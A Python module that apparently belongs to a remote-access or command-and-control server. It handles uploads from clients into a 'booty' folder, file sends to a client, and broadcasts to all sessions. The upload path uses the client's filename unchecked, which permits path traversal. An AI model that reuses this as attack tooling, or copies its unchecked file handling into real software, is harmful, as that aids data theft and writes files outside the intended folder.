# ======================== CONFIGURATION ========================
import os
from .common import recv_exact, CHUNK_SIZE

DEST_DIR = "booty"

# ======================== FILE HEADER PARSING ========================
def _parse_file_header(header):
    """Parse FILE command header."""
    parts = header.split()
    
    if len(parts) != 3 or parts[0] != "FILE":
        raise ValueError(f"Invalid FILE header: {header}")
    
    return parts[1], int(parts[2])

# ======================== FILE RECEIVING ========================
def receive_file_from_client(sock, header, dest_dir=DEST_DIR):
    """Receive a file from client."""
    filename, size = _parse_file_header(header)
    
    print(f"[*] Receiving file: {filename} ({size} bytes)")
    
    os.makedirs(dest_dir, exist_ok=True)
    dest_path = os.path.join(dest_dir, filename)
    
    file_data = recv_exact(sock, size)
    
    with open(dest_path, "wb") as f:
        f.write(file_data)
    
    return filename, size, dest_path

# ======================== FILE SENDING ========================
def _read_and_send_file(sock, filepath):
    """Read and send file in chunks."""
    with open(filepath, "rb") as f:
        while chunk := f.read(CHUNK_SIZE):
            sock.sendall(chunk)

def send_file(sock, filepath):
    """Send a file to client."""
    if not os.path.isfile(filepath):
        raise FileNotFoundError(f"File not found: {filepath}")
    
    size = os.path.getsize(filepath)
    name = os.path.basename(filepath)
    
    sock.sendall(f"FILE {name} {size}\n".encode())
    _read_and_send_file(sock, filepath)
    
    print(f"[+] File sent to client: {name}")

# ======================== BROADCAST FILE TRANSFER ========================
def _get_broadcast_file(base_dir):
    """Get file for broadcasting."""
    from .common import choose_file_to_send
    return choose_file_to_send(base_dir)

def broadcast_sendfile(base_dir, record_transfer_callback):
    """Send file to all clients."""
    from .sessions import get_all_clients
    
    filename = _get_broadcast_file(base_dir)
    if not filename:
        return
    
    full_path = os.path.join(base_dir, filename)
    size = os.path.getsize(full_path)
    
    for cid, sock in get_all_clients():
        try:
            send_file(sock, full_path)
            record_transfer_callback(cid, "send", filename, size, "broadcast")
            print(f"[+] File sent to client {cid}")
        except Exception as e:
            print(f"[!] Error sending file to client {cid}: {e}")